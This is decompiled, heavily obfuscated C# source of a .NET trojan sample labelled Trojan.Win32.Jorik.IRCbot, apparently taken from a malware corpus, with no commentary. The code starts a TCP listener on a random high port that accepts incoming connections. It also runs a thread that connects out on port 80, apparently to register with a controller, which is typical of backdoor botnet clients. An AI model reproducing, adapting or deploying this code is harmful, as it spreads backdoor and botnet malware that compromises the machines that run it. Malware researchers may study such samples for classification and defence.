// Decompiled with JetBrains decompiler
// Type: .
// Assembly: insomnia, Version=0.0.0.0, Culture=neutral, PublicKeyToken=24b8f1c2e28acde2
// MVID: 0C7B899D-7035-4B2D-B433-3C80E566FC1C
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00001-msil\Trojan.Win32.Jorik.IRCbot.gim-3e8d8a98ac44098acc3d92301b4ae92e5e6e1a5f0b2d861cd9e69e0650edce63.exe

using \u0004;
using \u0006;
using \u000E;
using \u000F;
using System;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security;
using System.Threading;

namespace \u000E
{
  internal sealed class \u0004
  {
    private static Random \u0001;
    public static int \u0001;
    public static string \u0001;
    public static bool \u0001;
    public static bool \u0002;
    [NonSerialized]
    internal static \u0008.\u0004 \u0017;

    public static string \u0001()
    {
      string[] strArray = new string[11]
      {
        \u000E.\u0004.\u0017(4204),
        \u0002.\u0001(\u0010.\u008D(\u000E.\u0004.\u0017(624), \u0002.\u0001)),
        \u000E.\u0004.\u0017(3892),
        \u0002.\u0001(\u0089.\u0002\u0003((object) \u000E.\u0004.\u0017(624), (object) \u000E.\u0004.\u0001)),
        \u000E.\u0004.\u0017(4225),
        \u0002.\u0001(\u0010.\u008D(\u000E.\u0004.\u0017(624), \u0001.\u0007)),
        null,
        null,
        null,
        null,
        null
      };
      do
      {
        strArray[6] = \u000E.\u0004.\u0017(4242);
      }
      while (false);
      strArray[7] = \u0002.\u0001(\u0010.\u008D(\u000E.\u0004.\u0017(624), \u0001.\u0008));
      strArray[8] = \u000E.\u0004.\u0017(4259);
      strArray[9] = \u0002.\u0001(\u0010.\u008D(\u000E.\u0004.\u0017(624), \u000E.\u0004.\u0001));
      strArray[10] = \u000E.\u0004.\u0017(538);
      return \u0018.\u001A\u0002(strArray);
    }

    public static void \u0001()
    {
      \u0013 obj1 = \u0013.\u0002\u0002;
      Thread thread1 = new Thread(new ThreadStart(\u000E.\u0004.\u0003));
      if (true)
        goto label_6;
label_1:
      if (false)
        return;
      \u001F.\u0087\u0002(5000);
      \u000E.\u0004.\u0002 = true;
      if (false)
        return;
      \u0013.\u0002\u0002((object) new Thread(new ThreadStart(\u000E.\u0004.\u0002)));
      \u0013 obj2 = \u0013.\u0002\u0002;
      Thread thread2 = new Thread(new ThreadStart(\u000E.\u0004.\u0004));
      if (false)
        return;
      obj2((object) thread2);
      return;
label_6:
      obj1((object) thread1);
      goto label_1;
    }

    public static void \u0002()
    {
      TcpListener tcpListener;
      do
      {
        if (true)
        {
          if (true)
          {
            tcpListener = new TcpListener(\u000E.\u0004.\u0001);
            \u0013.\u007E\u0010\u0002((object) tcpListener);
            goto label_5;
          }
        }
        else
          goto label_8;
label_4:
        \u0003 obj;
        Thread thread = new Thread(new ThreadStart(obj.\u0001));
        \u0013.\u007E\u0002\u0002((object) thread);
label_5:
        TcpClient tcpClient;
        if (\u000E.\u0004.\u0002)
          tcpClient = \u0095\u0002.\u007E\u0082\u0004((object) tcpListener);
        else
          continue;
label_8:
        obj = new \u0003(tcpClient);
        goto label_4;
      }
      while (false);
      \u0013.\u007E\u0011\u0002((object) tcpListener);
    }

    public static void \u0003()
    {
      try
      {
        if (true)
          goto label_2;
label_1:
        \u000E.\u0004.\u0001 = \u000E.\u0004.\u0017(4277);
        return;
label_2:
        \u0003.\u0001();
        \u0003.\u0001(\u000E.\u0004.\u0001, \u000E.\u0004.\u0001, \u000E.\u0004.\u0017(4272), \u0001.\u0002);
        goto label_1;
      }
      catch
      {
      }
    }

    public static void \u0004()
    {
      \u001F.\u0087\u0002(10000);
label_1:
      try
      {
        if (true)
          \u0002.\u0001(\u0002.\u0001, \u000E.\u0004.\u0001, \u000E.\u0004.\u0017(4282), (ushort) 80, \u0001.\u0007, \u0001.\u0008);
label_3:
        if (true)
        {
          \u0002.\u0001(\u000E.\u0004.\u0001(), \u0001.\u0010);
          do
          {
            if (true)
            {
              if (true)
                \u000E.\u0004.\u0001 = true;
            }
            else
              goto label_3;
          }
          while (false);
        }
        else
          goto label_1;
      }
      catch
      {
      }
    }

    static \u0004()
    {
      \u0005.\u0001(typeof (\u000E.\u0004));
      bool flag = false;
      Assembly assembly = \u007F.\u0089\u0002();
      if (!\u000E.\u0004.\u0001(\u0003.\u007E\u0006((object) assembly), true, out flag) || !flag || !\u0005.\u007E\u0082((object) \u0003.\u007E\u0007((object) assembly), \u000E.\u0004.\u0017(712)))
        throw new SecurityException(\u000E.\u0004.\u0017(737));
      \u000E.\u0004.\u0001 = new Random();
      \u000E.\u0004.\u0001 = \u0097\u0002.\u0084\u0004(\u0096\u0002.\u007E\u0083\u0004((object) \u000E.\u0004.\u0001, 2000, 20000));
      \u000E.\u0004.\u0001 = \u000E.\u0004.\u0017(4303);
      \u000E.\u0004.\u0001 = false;
      \u000E.\u0004.\u0002 = false;
    }

    [DllImport("mscorwks.dll", EntryPoint = "StrongNameSignatureVerificationEx", CharSet = CharSet.Unicode)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool \u0001([MarshalAs(UnmanagedType.LPWStr)] string _param0, [MarshalAs(UnmanagedType.Bool)] bool _param1, [MarshalAs(UnmanagedType.Bool)] out bool _param2);
  }
}
